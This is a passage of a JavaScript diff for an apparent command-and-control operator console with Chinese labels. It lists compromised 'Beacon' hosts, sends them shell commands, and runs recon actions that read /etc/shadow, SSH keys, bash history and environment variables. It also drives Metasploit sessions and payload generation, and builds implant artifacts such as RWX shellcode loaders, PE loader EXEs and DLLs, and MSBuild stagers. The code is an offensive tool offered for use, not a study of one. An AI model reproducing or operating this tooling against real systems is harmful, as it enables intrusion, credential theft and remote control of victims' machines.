+  {label:'系统信息', taskType:'command_run', tone:'recon', commandText:'echo "=== HOSTNAME ===" && hostname && echo "=== WHOAMI ===" && whoami && echo "=== ID ===" && id && echo "=== UNAME ===" && uname -a && echo "=== IP ===" && ip addr 2>/dev/null || ifconfig 2>/dev/null'},
+  {label:'网络连接', taskType:'network_inspect', tone:'recon', arguments:{targets:[]}, needsTargets:true, targetLabel:'探测目标 host:port（逗号分隔）'},
+  {label:'进程列表', taskType:'process_inspect', tone:'recon', arguments:{includeTree:true}},
+  {label:'读取 /etc/hosts', taskType:'file_collect', tone:'recon', arguments:{paths:['/etc/hosts'], maxBytes:1048576}},
+  {label:'网卡信息', taskType:'command_run', tone:'recon', commandText:'ip addr 2>/dev/null || ifconfig'},
+  {label:'路由表', taskType:'command_run', tone:'recon', commandText:'ip route 2>/dev/null || route -n'},
+  {label:'ARP 邻居', taskType:'command_run', tone:'recon', commandText:'ip neigh 2>/dev/null || arp -a'},
+  {label:'计划任务', taskType:'command_run', tone:'recon', commandText:'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null'},
+  {label:'历史命令', taskType:'command_run', tone:'recon', commandText:'cat ~/.bash_history 2>/dev/null | tail -50'},
+  {label:'环境变量', taskType:'command_run', tone:'recon', commandText:'env'},
+  {label:'系统信息增强', taskType:'command_run', tone:'recon', commandText:'cat /etc/os-release 2>/dev/null; uname -r'},
+  {label:'SUID 文件', taskType:'command_run', tone:'recon', commandText:'find / -perm -4000 -type f 2>/dev/null | head -40'},
+  {label:'可写目录', taskType:'command_run', tone:'recon', commandText:"find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)' | head -30"},
+  {label:'shadow 读取测试', taskType:'command_run', tone:'recon', commandText:"head -5 /etc/shadow 2>/dev/null || echo 'no read perm'"},
+  {label:'用户枚举', taskType:'user_list', tone:'recon', arguments:{}},
+  {label:'截取屏幕', taskType:'screenshot', tone:'recon', arguments:{}},
+  {label:'监听端口', taskType:'command_run', tone:'recon', commandText:'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'},
+  {label:'登录审计', taskType:'command_run', tone:'recon', commandText:"last -n 20 2>/dev/null; echo '=== WHO ==='; w 2>/dev/null"},
+  {label:'DNS 配置', taskType:'command_run', tone:'recon', commandText:'cat /etc/resolv.conf 2>/dev/null; cat /etc/nsswitch.conf 2>/dev/null | head -20'},
+  {label:'SSH 密钥', taskType:'command_run', tone:'recon', commandText:"ls -la ~/.ssh 2>/dev/null; echo '=== AUTHORIZED_KEYS ==='; cat ~/.ssh/authorized_keys 2>/dev/null"},
+  {label:'已装软件', taskType:'command_run', tone:'recon', commandText:'dpkg -l 2>/dev/null | head -40 || rpm -qa 2>/dev/null | head -40'},
+];
+
+function $(s){ return document.querySelector(s); }
+function $$(s){ return document.querySelectorAll(s); }
+function esc(s){ return (s||'').toString().replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function fmtTime(v){ if (!v) return '-'; var d = new Date(v); return isNaN(d.getTime()) ? v : d.toLocaleString('zh-CN',{hour12:false}); }
+
+function log(text, kind) {
+  var out = $('#dock-output');
+  var div = document.createElement('div');
+  div.className = 'l-' + (kind || 'info');
+  div.textContent = (kind === 'command' ? 'shell> ' : '') + text;
+  out.appendChild(div);
+  while (out.children.length > 120) out.removeChild(out.firstChild);
+  out.scrollTop = out.scrollHeight;
+}
+
+function switchTab(name) {
+  state.tab = name;
+  $$('.mc-tab-btn[data-tab]').forEach(function(b){ b.classList.toggle('active', b.dataset.tab === name); });
+  $$('.tab-content').forEach(function(c){ c.style.display = (c.id === 'tab-' + name) ? 'block' : 'none'; });
+  renderDock();
+  if (name === 'listeners') loadListeners();
+  if (name === 'msf') loadMsfStatus();
+  if (name === 'beacons') { populateListenerSelect(); initArtifactUI(); }
+}
+
+/* ---------------- overview polling ---------------- */
+
+function loadOverview() {
+  fetch('/api/admin/managed/overview').then(function(r){ return r.json(); }).then(function(data){
+    state.overview = data;
+    $('#t-online').textContent = data.stats.onlineHosts;
+    $('#t-hosts').textContent = data.stats.hosts;
+    $('#t-tasks').textContent = data.tasks.length;
+    var pw = $('#t-pending-wrap'), pending = data.stats.pendingApprovals;
+    pw.style.display = pending ? 'inline' : 'none';
+    $('#t-pending').textContent = pending;
+    $('#overview-generated').textContent = '更新于 ' + new Date().toLocaleTimeString('zh-CN', {hour12:false});
+    renderHosts(data.hosts || []);
+    renderTasks(data.tasks || []);
+    renderDock();
+    if (state.tab === 'listeners') renderListenerCards(data.listeners || []);
+  }).catch(function(e){ log('[err] overview 加载失败: ' + e.message, 'error'); });
+}
+
+function selectedHost() {
+  var hosts = (state.overview || {}).hosts || [];
+  for (var i = 0; i < hosts.length; i++) if (hosts[i].id === state.selectedHostId) return hosts[i];
+  return null;
+}
+function hostTasks(hostId) {
+  return ((state.overview || {}).tasks || []).filter(function(t){ return t.hostId === hostId; });
+}
+function listenerName(id) {
+  var ls = (state.overview || {}).listeners || [];
+  for (var i = 0; i < ls.length; i++) if (ls[i].id === id) return ls[i].name;
+  return id ? ('#' + id) : '-';
+}
+
+function renderHosts(hosts) {
+  var rows = '';
+  hosts.forEach(function(h){
+    var sel = state.selectedHostId === h.id ? ' selected' : '';
+    var note = (h.metadata || {}).note || '';
+    rows += '<tr class="mc-row' + sel + '" data-id="' + h.id + '" onclick="clickHost(' + h.id + ',event)" ondblclick="dblClickHost(' + h.id + ')" oncontextmenu="showHostMenu(event, ' + h.id + ')">'
+      + '<td><span class="mc-dot ' + esc(h.status) + '"></span></td>'
+      + '<td><code class="mc-mono">' + esc((h.externalIps||[])[0] || '-') + '</code></td>'
+      + '<td><code class="mc-mono">' + esc((h.internalIps||[])[0] || '-') + '</code></td>'
+      + '<td>' + esc(h.username || '-') + '</td>'
+      + '<td>' + esc(h.hostname || h.displayName || '-') + (h.metadata && h.metadata.archived ? ' <span class="badge badge-warning" style="margin-left:4px">已归档</span>' : '') + '</td>'
+      + '<td>' + esc(h.osVersion || h.platform || '-') + '</td>'
+      + '<td>' + esc(h.architecture || '-') + '</td>'
+      + '<td>' + esc(listenerName(h.listenerId)) + '</td>'
+      + '<td class="muted-sm">' + esc(fmtTime(h.lastSeenAt)) + '</td>'
+      + '<td class="muted-sm mc-note-cell" title="' + esc(note) + '">' + esc(note || '-') + '</td>'
+      + '<td><button class="mc-x" title="删除主机" onclick="deleteHost(' + h.id + ',event)">✕</button></td>'
+      + '</tr>';
+  });
+  $('#hosts-tbody').innerHTML = rows;
+  $('#hosts-empty').style.display = hosts.length ? 'none' : 'block';
+  if (state.selectedHostId && !hosts.some(function(h){ return h.id === state.selectedHostId; })) {
+    state.selectedHostId = null; state.interactMode = false;
+  }
+}
+
+function clickHost(id, ev) { selectHost(id, false); }
+function dblClickHost(id) { selectHost(id, true); }
+
+function selectHost(id, engage) {
+  state.selectedHostId = id;
+  if (engage) state.interactMode = true;
+  $$('tr.mc-row').forEach(function(r){ r.classList.toggle('selected', +r.dataset.id === id); });
+  var h = selectedHost();
+  if (!h) return;
+  var label = h.hostname || h.displayName || ('#' + id);
+  if (state.interactMode) {
+    $('#cmd-prefix').textContent = label + '> ';
+    if (engage) log('[sys] 已绑定交互目标：' + label + '（' + ((h.externalIps||[])[0]||'-') + '）', 'info');
+  }
+  renderDock();
+}
+
+function latestTaskOf(hostId) {
+  var ts = hostTasks(hostId);
+  return ts.length ? ts[0] : null;
+}
+
+/* 16-item info strip — source infoItems parity. */
+function renderInfoStrip() {
+  var h = selectedHost();
+  if (!h) { $('#info-strip').innerHTML = ''; return; }
+  var tasks = hostTasks(h.id);
+  var queued = tasks.filter(function(t){ return t.status === 'queued'; }).length;
+  var latest = latestTaskOf(h.id);
+  var sessionLabel = '-';
+  var sessions = (state.overview || {}).sessions || [];
+  for (var i = 0; i < sessions.length; i++) if (sessions[i].hostId === h.id) { sessionLabel = '#' + sessions[i].id; break; }
+  var items = [
+    ['外部 IP', (h.externalIps||[])[0] || '-'],
+    ['内部 IP', (h.internalIps||[]).join(', ') || '-'],
+    ['用户', h.username || '-', h.username === 'root' ? 'root' : ''],
+    ['主机名', h.hostname || h.displayName || '-'],
+    ['系统', h.osVersion || h.platform || '-'],
+    ['架构', h.architecture || '-'],
+    ['状态', h.status],
+    ['最后心跳', fmtTime(h.lastSeenAt)],
+    ['会话', sessionLabel],
+    ['传输通道', listenerName(h.listenerId)],
+    ['任务', '共 ' + tasks.length + ' 条'],
+    ['租约', latest ? (latest.taskCode || ('#' + latest.id)) : '-'],
+    ['排队任务', String(queued)],
+    ['运行中任务', String((state.overview.runtimeSummary || {}).runningTaskCount || 0)],
+    ['租约异常', String(((state.overview.leaseDiagnostics || {}).reclaimedTasks || 0) + ((state.overview.leaseDiagnostics || {}).failedTasks || 0))],
+    ['最近任务', latest ? (latest.title || latest.taskType) : '-'],
+  ];
+  var html = '';
+  items.forEach(function(it){
+    html += '<div class="mc-info-item"><div class="label">' + esc(it[0]) + '</div>'
+          + '<div class="value' + (it[2] ? ' ' + it[2] : '') + '">' + esc(it[1]) + '</div></div>';
+  });
+  $('#info-strip').innerHTML = html;
+}
+
+function renderQuickActions() {
+  var html = '';
+  QUICK_ACTIONS.forEach(function(a, i){
+    html += '<button type="button" class="mc-qbtn" onclick="quickAction(' + i + ')">' + a.label + '</button>';
+  });
+  html += '<button type="button" class="mc-qbtn" style="border-color:color-mix(in srgb, var(--danger) 40%, transparent);color:var(--danger)" onclick="promptWriteFile()">写文件</button>';
+  html += '<button type="button" class="mc-qbtn" style="border-color:color-mix(in srgb, var(--danger) 40%, transparent);color:var(--danger)" onclick="promptKill()">终止进程</button>';
+  $('#quick-actions').innerHTML = html;
+}
+
+/* dock visibility rule from source: only on table/tasks with a selected host
+   and after double-click engagement. */
+function renderDock() {
+  var dock = $('#console-dock');
+  var show = !!state.selectedHostId && (state.tab === 'table' || state.tab === 'tasks') && state.interactMode;
+  dock.style.display = show ? 'block' : 'none';
+  if (!show) return;
+  renderInfoStrip();
+  renderQuickActions();
+  renderTranscriptMerge();
+}
+
+function renderTranscriptMerge() {
+  var h = selectedHost();
+  if (!h) return;
+  var lines = [];
+  hostTasks(h.id).slice().reverse().forEach(function(t){
+    if (t.commandText) lines.push({ cls:'l-command', text:t.commandText });
+    if (['completed','failed','cancelled'].indexOf(t.status) >= 0 && t.resultSummary) {
+      lines.push({ cls: t.status === 'completed' ? 'l-result' : 'l-error', text:t.resultSummary });
+    }
+  });
+  var existing = $('#dock-output').querySelectorAll('.l-command,.l-result,.l-error:not(.local)');
+  // Local lines (operator echo / errors) persist; transcript lines are re-rendered.
+  var locals = [];
+  $('#dock-output').querySelectorAll('.l-info,.l-ok,[data-local]').forEach(function(n){ locals.push(n); });
+  $('#dock-output').innerHTML = '';
+  locals.forEach(function(n){ $('#dock-output').appendChild(n); });
+  lines.slice(-80).forEach(function(l){
+    var div = document.createElement('div');
+    div.className = l.cls;
+    div.textContent = l.text;
+    $('#dock-output').appendChild(div);
+  });
+  $('#dock-output').scrollTop = $('#dock-output').scrollHeight;
+}
+
+/* ---------------- tasks tab ---------------- */
+
+function renderTasks(tasks) {
+  var names = {};
+  ((state.overview || {}).hosts || []).forEach(function(h){ names[h.id] = h.hostname || h.displayName || ('#' + h.id); });
+  var scoped = state.selectedHostId ? tasks.filter(function(t){ return t.hostId === state.selectedHostId; }) : tasks;
+  var rows = '';
+  scoped.forEach(function(t){
+    var actions = '';
+    if (t.approvalStatus === 'pending') {
+      actions = '<button class="btn-ghost" onclick="reviewTask(' + t.id + ',\'approve\')">批准</button> <button class="btn-ghost danger" onclick="reviewTask(' + t.id + ',\'reject\')">拒绝</button>';
+    } else if (['queued','leased','running','pending_approval'].indexOf(t.status) >= 0) {
+      actions = '<button class="btn-ghost danger" onclick="reviewTask(' + t.id + ',\'cancel\')">取消</button>';
+    }
+    rows += '<tr><td>' + t.id + '</td><td><code class="mc-mono">' + esc(t.taskCode || '-') + '</code></td>'
+      + '<td><code class="mc-mono">' + esc(t.taskType) + '</code></td>'
+      + '<td style="max-width:220px;overflow:hidden;text-overflow:ellipsis" title="' + esc(t.commandText || '') + '">' + esc((t.commandText || t.title || '').substr(0,60)) + '</td>'
+      + '<td><span class="pill ' + esc(t.status) + '">' + esc(t.status) + '</span></td>'
+      + '<td><span class="risk-' + esc(t.riskLevel || 'low') + '">' + esc(t.riskLevel || '-') + '</span></td>'
+      + '<td>' + (t.requiresApproval ? '<span class="pill ' + esc(t.approvalStatus) + '">' + esc(t.approvalStatus) + '</span>' : '<span class="muted-sm">-</span>') + '</td>'
+      + '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + esc(t.resultSummary || '') + '">' + esc((t.resultSummary || '-').substr(0,80)) + '</td>'
+      + '<td style="white-space:nowrap">' + actions + '</td></tr>';
+  });
+  $('#tasks-tbody').innerHTML = rows || '<tr><td colspan="9" class="empty-hint">暂无任务</td></tr>';
+}
+
+/* ---------------- dispatch ---------------- */
+
+function dispatchTask(taskType, payload) {
+  if (!state.selectedHostId) { log('[err] 未选择主机 — 双击 Beacon 进入交互后下发。', 'error'); return; }
+  var body = Object.assign({ hostId: state.selectedHostId, taskType: taskType }, payload || {});
+  fetch('/api/admin/managed/tasks', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) })
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      if (d.detail) { log('[err] ' + d.detail, 'error'); return; }
+      log('[ok] Task #' + d.taskId + (d.requiresApproval ? ' 已创建，等待审批' : ' queued'), 'ok');
+      loadOverview();
+    })
+    .catch(function(e){ log('[err] ' + e.message, 'error'); });
+}
+
+function quickAction(i) {
+  var a = QUICK_ACTIONS[i];
+  var args = Object.assign({}, a.arguments || {});
+  if (a.needsTargets) {
+    var raw = prompt(a.targetLabel);
+    if (!raw) return;
+    args.targets = raw.split(',').map(function(item){
+      var p = item.trim().split(':');
+      return { host: p[0], port: parseInt(p[1] || '80', 10) };
+    });
+  }
+  dispatchTask(a.taskType, { commandText: a.commandText || '', arguments: args });
+}
+function promptKill() {
+  var pid = prompt('输入要终止的 PID：'); if (!pid) return;
+  dispatchTask('process_kill', { arguments: { pid: parseInt(pid,10), signal: 15 } });
+}
+function promptWriteFile() {
+  var path = prompt('目标路径：'); if (!path) return;
+  var content = prompt('写入内容：'); if (content === null) return;
+  dispatchTask('file_write', { commandText: path, arguments: { path: path, content: content } });
+}
+
+function sendCommand() {
+  var input = $('#cmd-input');
+  var cmd = input.value.trim();
+  if (!cmd) return;
+  log(cmd, 'command');
+  state.cmdHistory.unshift(cmd);
+  state.cmdHistory = state.cmdHistory.slice(0, 50);
+  state.cmdHistoryIdx = -1;
+  input.value = '';
+  if (cmd.indexOf('read:') === 0) {
+    var path = cmd.substring(5).trim();
+    dispatchTask('file_collect', { arguments: { paths:[path], maxBytes:1048576 }, commandText: path });
+  } else if (cmd.indexOf('note:') === 0) {
+    setHostNote(cmd.substring(5).trim());
+  } else if (cmd.indexOf('interval:') === 0) {
+    setIntervalValue(parseInt(cmd.substring(9).trim(), 10));
+  } else {
+    dispatchTask('command_run', { commandText: cmd, arguments: { timeoutSeconds: 60 } });
+  }
+}
+
+function cmdKeydown(ev) {
+  if (ev.key === 'Enter') sendCommand();
+  else if (ev.key === 'ArrowUp') {
+    if (state.cmdHistoryIdx < state.cmdHistory.length - 1) { state.cmdHistoryIdx += 1; $('#cmd-input').value = state.cmdHistory[state.cmdHistoryIdx]; }
+    ev.preventDefault();
+  } else if (ev.key === 'ArrowDown') {
+    if (state.cmdHistoryIdx > 0) { state.cmdHistoryIdx -= 1; $('#cmd-input').value = state.cmdHistory[state.cmdHistoryIdx]; }
+    else { state.cmdHistoryIdx = -1; $('#cmd-input').value = ''; }
+    ev.preventDefault();
+  }
+}
+
+/* host metadata helpers (source: 设置心跳 / 设置备注 context-menu actions) */
+function setHostNote(note) {
+  if (!state.selectedHostId) return;
+  fetch('/api/admin/managed/hosts/' + state.selectedHostId + '/note', {
+    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ note: note }),
+  }).then(function(){ log('[ok] 备注已更新', 'info'); loadOverview(); });
+}
+function setIntervalValue(seconds) {
+  if (!seconds || seconds < 1) { log('[err] 心跳间隔需为正整数秒', 'error'); return; }
+  fetch('/api/admin/managed/hosts/' + state.selectedHostId + '/note', {
+    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ beaconIntervalSeconds: seconds }),
+  }).then(function(){ log('[ok] Beacon 心跳间隔 → ' + seconds + 's（下次 checkin 生效）', 'info'); loadOverview(); });
+}
+
+function reviewTask(taskId, action) {
+  var reason = action === 'approve' ? '' : (prompt('原因（可选）：') || '');
+  fetch('/api/admin/managed/tasks/' + taskId + '/review', {
+    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ action: action, reason: reason }),
+  }).then(function(r){ return r.json(); }).then(function(d){
+    if (d.detail) { log('[err] ' + d.detail, 'error'); }
+    else { log('[ok] Task #' + taskId + ' ' + action, 'ok'); }
+    loadOverview();
+  });
+}
+
+function deleteHost(id, ev) {
+  ev.stopPropagation();
+  if (!confirm('确认删除该主机及其任务/证据/会话记录？')) return;
+  fetch('/api/admin/managed/hosts/' + id + '?force=true', { method:'DELETE' })
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      if (d.detail) { alert(d.detail); return; }
+      log('[ok] 主机 #' + id + ' 已删除（级联）', 'info');
+      loadOverview();
+    });
+}
+
+/* ---------------- listeners tab ---------------- */
+
+function loadListeners() {
+  fetch('/api/admin/managed/listeners').then(function(r){ return r.json(); }).then(function(data){
+    var sel = $('#listener-transport');
+    if (!sel.options.length) (data.transports || []).forEach(function(t){
+      var o = document.createElement('option'); o.value = t; o.textContent = t; sel.appendChild(o);
+    });
+    renderListenerCards(data.listeners || []);
+  });
+}
+
+function renderListenerCards(listeners) {
+  var html = '';
+  listeners.forEach(function(l){
+    html += '<div class="cardbox">'
+      + '<h3 class="sec" style="margin-bottom:4px">' + esc(l.name)
+      + ' <span class="pill ' + (l.status === 'active' ? 'online' : 'offline') + '">' + esc(l.status) + '</span></h3>'
+      + '<div class="mc-mono muted-sm" style="margin-bottom:8px">' + esc(l.transport) + ' · ' + esc(l.bindAddress) + ':' + l.bindPort + (l.tlsEnabled ? ' · TLS' : '') + '</div>'
+      + '<div style="display:flex;gap:6px;flex-wrap:wrap">'
+      + '<button class="btn-ghost" onclick="toggleManagedListener(' + l.id + ',\'' + (l.status === 'active' ? 'disabled' : 'active') + '\')">' + (l.status === 'active' ? '停止' : '启动') + '</button>'
+      + '<button class="btn-ghost" onclick="rotateManagedListener(' + l.id + ')">轮换</button>'
+      + '<button class="btn-ghost danger" onclick="deleteManagedListener(' + l.id + ')">删除</button>'
+      + '</div></div>';
+  });
+  $('#listener-grid').innerHTML = html || '<p class="muted-sm">暂无监听器</p>';
+}
+
+function createListener(ev) {
+  ev.preventDefault();
+  var f = ev.target;
+  fetch('/api/admin/managed/listeners', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ name:f.name.value.trim(), transport:f.transport.value, bindAddress:f.bindAddress.value, bindPort:parseInt(f.bindPort.value,10), tlsEnabled:f.transport.value.indexOf('https')===0, status:'active' }),
+  }).then(function(r){ return r.json(); }).then(function(d){
+    if (d.detail) { alert(d.detail); return; }
+    $('#listener-new-token').style.display = 'block';
+    $('#listener-token-value').textContent = d.listener.registrationToken;
+    f.reset();
+    loadListeners(); loadOverview();
+  });
+  return false;
+}
+function toggleManagedListener(id, status) {
+  fetch('/api/admin/managed/listeners/' + id, { method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ status:status }) })
+    .then(function(){ loadListeners(); loadOverview(); });
+}
+function rotateManagedListener(id) {
+  if (!confirm('轮换后已部署 Beacon 将无法通过校验，需重新生成分发。继续？')) return;
+  fetch('/api/admin/managed/listeners/' + id + '/rotate-token', { method:'POST' })
+    .then(function(r){ return r.json(); }).then(function(d){
+      if (d.detail) { alert(d.detail); return; }
+      $('#listener-new-token').style.display = 'block';
+      $('#listener-token-value').textContent = d.listener.registrationToken;
+      loadListeners();
+    });
+}
+function deleteManagedListener(id) {
+  var reason = prompt('删除监听器需审计原因：');
+  if (!reason || !reason.trim()) return;
+  fetch('/api/admin/managed/listeners/' + id, { method:'DELETE', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ auditReason:reason }) })
+    .then(function(r){ return r.json(); }).then(function(d){
+      if (d.detail) { alert(d.detail); return; }
+      log('[ok] 监听器已删除（解绑主机 ' + d.detachedHosts + ' / 关闭会话 ' + d.closedSessions + ' / 取消任务 ' + d.cancelledTasks + '）', 'info');
+      loadListeners(); loadOverview();
+    });
+}
+
+/* ---------------- beacons tab ---------------- */
+
+function populateListenerSelect() {
+  fetch('/api/admin/managed/listeners').then(function(r){ return r.json(); }).then(function(data){
+    var sel = $('#beacon-listener');
+    sel.innerHTML = '';
+    (data.listeners || []).filter(function(l){ return l.status === 'active'; }).forEach(function(l){
+      var o = document.createElement('option'); o.value = l.id;
+      o.textContent = l.name + ' · ' + l.transport + ' · :' + l.bindPort;
+      sel.appendChild(o);
+    });
+    onBeaconListenerChange();
+  });
+}
+function onBeaconListenerChange() {
+  var listeners = ((state.overview || {}).listeners) || [];
+  var id = parseInt($('#beacon-listener').value || '0', 10);
+  for (var i = 0; i < listeners.length; i++) if (listeners[i].id === id) {
+    var addr = listeners[i].bindAddress;
+    document.querySelector('#beacon-form [name=targetHost]').value = (addr === '0.0.0.0' || addr === '::') ? location.hostname : addr;
+    document.querySelector('#beacon-form [name=targetPort]').value = location.port || (location.protocol === 'https:' ? '443' : '80');
+    break;
+  }
+}
+function generateBeacon(ev) {
+  ev.preventDefault();
+  var f = ev.target;
+  fetch('/api/admin/managed/beacons/generate', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ listenerId:parseInt(f.listenerId.value||'0',10), runtimeType:f.runtimeType.value, targetHost:f.targetHost.value, targetPort:parseInt(f.targetPort.value,10), sleepSeconds:parseInt(f.sleepSeconds.value,10) }),
+  }).then(function(r){ return r.json(); }).then(function(d){
+    if (d.detail) { $('#beacon-result').textContent = '生成失败：' + d.detail; return; }
+    state.lastBeacon = d;
+    $('#beacon-result').textContent = d.code;
+    $('#beacon-meta').textContent = d.filename + ' · sha256:' + (d.metadata||{}).artifactHash;
+    log('[ok] Beacon 已生成：' + d.filename, 'info');
+  });
+  return false;
+}
+function downloadBeacon() {
+  if (!state.lastBeacon) return;
+  var blob = new Blob([state.lastBeacon.code], { type:'text/plain' });
+  var a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = state.lastBeacon.filename;
+  a.click();
+}
+function copyBeacon() {
+  if (!state.lastBeacon) return;
+  navigator.clipboard.writeText(state.lastBeacon.code).then(function(){ log('[ok] 已复制到剪贴板', 'info'); });
+}
+
+/* ---------------- msf tab ---------------- */
+
+function loadMsfStatus() {
+  fetch('/api/admin/msf/status').then(function(r){ return r.json(); }).then(function(data){
+    var bar = $('#msf-status-bar');
+    if (!data.available) bar.innerHTML = '<span style="color:var(--warning)">⚠ 降级模式</span> — ' + esc(data.reason || '');
+    else if (data.connected) { bar.innerHTML = '<span style="color:var(--success)">● 已连接 msfrpcd ' + esc(data.version) + '</span>'; loadMsfSessions(); }
+    else bar.innerHTML = '<span style="color:var(--warning)">○ 未连接</span> — ' + esc(data.reason || '守护进程未运行');
+    var sel = $('#msf-payload-select');
+    if (!sel.options.length) (data.payloadPresets || []).forEach(function(p){
+      var o = document.createElement('option'); o.value = p; o.textContent = p; sel.appendChild(o);
+    });
+    loadMsfConfig();
+  });
+}
+function loadMsfConfig() {
+  fetch('/api/admin/msf/config').then(function(r){ return r.json(); }).then(function(cfg){
+    var f = $('#msf-config-form');
+    f.host.value = cfg.host; f.port.value = cfg.port; f.username.value = cfg.username; f.ssl.checked = cfg.ssl;
+  });
+}
+function saveMsfConfig(ev) {
+  ev.preventDefault();
+  var f = ev.target;
+  fetch('/api/admin/msf/config', { method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ host:f.host.value, port:parseInt(f.port.value,10), username:f.username.value, password:f.password.value, ssl:f.ssl.checked }) })
+    .then(function(r){ return r.json(); }).then(function(d){
+      if (d.detail) { alert(d.detail); return; }
+      log('[ok] MSF 配置已保存', 'info'); loadMsfStatus();
+    });
+  return false;
+}
+function msfDaemon(action) {
+  fetch('/api/admin/msf/daemon/' + action, { method:'POST' })
+    .then(function(r){ return r.json(); }).then(function(d){
+      if (d.detail) { log('[err] ' + d.detail, 'error'); } else { log('[ok] msfrpcd ' + action, 'ok'); }
+      loadMsfStatus();
+    });
+}
+function loadMsfSessions() {
+  fetch('/api/admin/msf/sessions').then(function(r){ return r.json(); }).then(function(data){
+    if (data.detail) { $('#msf-sessions-tbody').innerHTML=''; return; }
+    var rows = '';
+    (data.sessions || []).forEach(function(s){
+      rows += '<tr><td>' + esc(s.id) + '</td><td>' + esc(s.type) + '</td><td>' + esc(s.info) + '</td>'
+        + '<td><code class="mc-mono">' + esc(s.tunnelPeer || '-') + '</code></td>'
+        + '<td><button class="btn-ghost danger" onclick="closeMsfSession(\'' + esc(s.id) + '\')">关闭</button></td></tr>';
+    });
+    $('#msf-sessions-tbody').innerHTML = rows || '<tr><td colspan="5" class="empty-hint">暂无 MSF 会话</td></tr>';
+  }).catch(function(){ $('#msf-sessions-tbody').innerHTML=''; });
+}
+function closeMsfSession(id) { fetch('/api/admin/msf/sessions/' + id, { method:'DELETE' }).then(loadMsfSessions); }
+function generateMsfPayload(ev) {
+  ev.preventDefault();
+  var f = ev.target;
+  fetch('/api/admin/msf/payloads/generate', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ payload:f.payload.value, lhost:f.lhost.value, lport:parseInt(f.lport.value,10), format:f.format.value }),
+  }).then(function(r){ return r.json(); }).then(function(d){
+    if (d.detail) { alert(d.detail); return; }
+    var blob = new Blob([atob(d.contentBase64)], { type:'application/octet-stream' });
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = d.filename;
+    a.click();
+    log('[ok] MSF payload 已生成：' + d.filename + '（' + d.size + ' B）', 'ok');
+  });
+  return false;
+}
+
+/* ---------------- generator dual-mode (source BeaconsPanel parity) ------- */
+var GEN_MODE = 'beacon';
+var ART_FORMATS = [
+  {id:'raw-shellcode',    desc:'nasm PIC stub (.bin)',   plats:'linux windows'},
+  {id:'shellcode-c',      desc:'C 数组导出',              plats:'linux windows'},
+  {id:'shellcode-python', desc:'ctypes RWX 加载器',       plats:'linux windows'},
+  {id:'pe-loader-exe',    desc:'mingw EXE',              plats:'windows'},
+  {id:'pe-loader-dll',    desc:'rundll32 DLL',           plats:'windows'},
+  {id:'msbuild-xml',      desc:'.csproj+cs zip',          plats:'windows'},
+  {id:'macos-macho',      desc:'Mach-O C 源码',           plats:'macos'},
+  {id:'android-apk',      desc:'smali 源码包',            plats:'android'},
+];
+var ART_ARCHES = ['x64','x86','arm64','arm'];
+
+function switchGenMode(mode) {
+  GEN_MODE = mode;
+  document.getElementById('gen-beacon').style.display = mode === 'beacon' ? 'block' : 'none';
+  document.getElementById('gen-artifact').style.display = mode === 'artifact' ? 'block' : 'none';
+  document.getElementById('gen-mode-beacon').classList.toggle('active', mode === 'beacon');
+  document.getElementById('gen-mode-artifact').classList.toggle('active', mode === 'artifact');
+}
+
+function initArtifactUI() {
+  var grid = document.getElementById('art-grid');
+  if (grid.children.length) return;
+  ART_FORMATS.forEach(function(f, i) {
+    var label = document.createElement('label');
+    label.className = 'art-card' + (i === 0 ? ' selected' : '');
+    label.innerHTML = '<input type="radio" name="artfmt" value="' + f.id + '"' + (i===0?' checked':'') + '>'
+      + '<div class="af-name">' + f.id + '</div><div class="af-desc">' + f.desc
+      + '<br><span style="opacity:.7">平台: ' + f.plats + '</span></div>';
+    label.addEventListener('click', function() {
+      grid.querySelectorAll('.art-card').forEach(function(c){ c.classList.remove('selected'); });
+      label.classList.add('selected');
+      label.querySelector('input').checked = true;
+    });
+    grid.appendChild(label);
+  });
+  var psel = document.getElementById('art-platform');
+  var asel = document.getElementById('art-arch');
+  if (!psel.options.length) {
+    ['linux','windows','macos','android'].forEach(function(p){
+      var o = document.createElement('option'); o.value = p; o.textContent = p; psel.appendChild(o);
+    });
+    ART_ARCHES.forEach(function(a){
+      var o = document.createElement('option'); o.value = a; o.textContent = a; asel.appendChild(o);
+    });
+  }
+}
+
+function generateArtifact() {
+  var fmt = document.querySelector('input[name=artfmt]:checked').value;
+  fetch('/api/admin/managed/artifacts/generate', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      format: fmt,
+      platform: document.getElementById('art-platform').value,
+      arch: document.getElementById('art-arch').value,
+      outputType: document.getElementById('art-output').value,
+    }),
+  }).then(function(r){ return r.json(); }).then(function(d){
+    if (d.detail) { document.getElementById('beacon-result').textContent = '生成失败：' + d.detail; return; }
+    state.lastArtifact = d;
+    var head = '== ' + d.filename + ' ==\n';
+    var bodyText = d.is_binary
+      ? '(二进制产物 ' + ((d.config||{}).size || '?') + ' 字节 — 点「下载脚本」保存)\n'
+      : d.code;
+    document.getElementById('beacon-result').textContent = head + bodyText + '\n[compile_log] ' + (d.compileLog || '');
+    document.getElementById('beacon-meta').textContent = d.description;
+    log('[ok] Artifact 已生成：' + d.filename + (d.is_binary ? '（二进制）' : ''), 'ok');
+  }).catch(function(e){ log('[err] ' + e.message, 'error'); });
+}
+
+function downloadCurrent() {
+  if (GEN_MODE === 'beacon') { downloadBeacon(); return; }
